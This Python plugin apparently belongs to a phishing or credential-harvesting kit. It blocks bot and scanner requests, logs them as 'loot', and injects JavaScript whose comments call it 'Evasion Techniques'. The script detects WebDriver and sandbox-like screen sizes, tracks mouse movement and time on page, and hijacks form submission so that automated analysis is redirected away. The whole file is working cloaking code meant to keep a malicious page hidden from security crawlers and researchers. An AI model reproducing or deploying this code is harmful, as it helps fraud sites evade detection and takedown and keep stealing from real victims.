import logging
from typing import Dict, Any

class AntiAnalysisPlugin:
    def __init__(self, api):
        self.api = api
        self.logger = api.get_logger("anti_analysis")
        
        # Register hooks
        # Note: In the real system, we'd pass 'self.check_request' directly, 
        # but here we assume the hook system calls it.
        # Priority 100 ensures this runs first (HIGHEST)
        self.api.plugin_manager.hook_system.register_hook("http.request.intercept", self, self.check_request)
        self.api.plugin_manager.hook_system.register_hook("template.after_generate", self, self.inject_js_checks)

    def check_request(self, request: Dict[str, Any]) -> bool:
        """Check incoming request for bot signatures"""
        # Return False to BLOCK the request, True to ALLOW
        
        user_agent = request.get("headers", {}).get("User-Agent", "")
        ip = request.get("remote_addr", "")
        
        if self.api.is_bot(user_agent, ip):
            self.logger.warning(f"Bot detected and blocked: {ip} - {user_agent}")
            # Log this event
            self.api.log_loot("anti_analysis", "bot_blocked", {
                "ip": ip,
                "user_agent": user_agent,
                "timestamp": "now"
            })
            return False 
            
        return True

    def inject_js_checks(self, html_content: str) -> str:
        """Inject advanced client-side anti-analysis and anti-bot checks."""
        js_code = """
        (function() {
            const redirectUrl = "https://www.google.com/search?q=news";
            let mouseMovements = 0;

            // --- Evasion Techniques ---

            // 1. Headless Browser & WebDriver Detection
            if (navigator.webdriver || (window.document.documentElement.getAttribute("webdriver"))) {
                console.warn("Evasion: WebDriver detected.");
                window.location.href = redirectUrl;
                return;
            }

            // 2. Screen Resolution Check (common VM/sandbox resolutions)
            const unusualResolutions = ["800x600", "1024x768", "1280x800"];
            const currentResolution = `${screen.width}x${screen.height}`;
            if (unusualResolutions.includes(currentResolution)) {
                console.warn(`Evasion: Unusual screen resolution detected: ${currentResolution}`);
                // This is a soft check, so we might just log it instead of redirecting.
            }

            // 3. Mouse Movement Entropy
            document.addEventListener('mousemove', () => {
                mouseMovements++;
            }, { once: true }); // Only need to know they moved it at least once

            // 4. Time-on-Page & Interaction Check
            const startTime = Date.now();
            const minTimeOnPage = 2000; // 2 seconds

            const originalSubmit = HTMLFormElement.prototype.submit;
            HTMLFormElement.prototype.submit = function() {
                const timeOnPage = Date.now() - startTime;
                
                if (timeOnPage < minTimeOnPage || mouseMovements === 0) {
                    console.warn(`Evasion: Form submission blocked. Time: ${timeOnPage}ms, Mouse Moves: ${mouseMovements}`);
                    // Don't submit the form, just redirect.
                    window.location.href = redirectUrl;
                    return;
                }
                
                // If checks pass, submit the form normally.
                originalSubmit.apply(this, arguments);
            };

        })();
        """
        return self.api.inject_script(html_content, script_content=js_code)
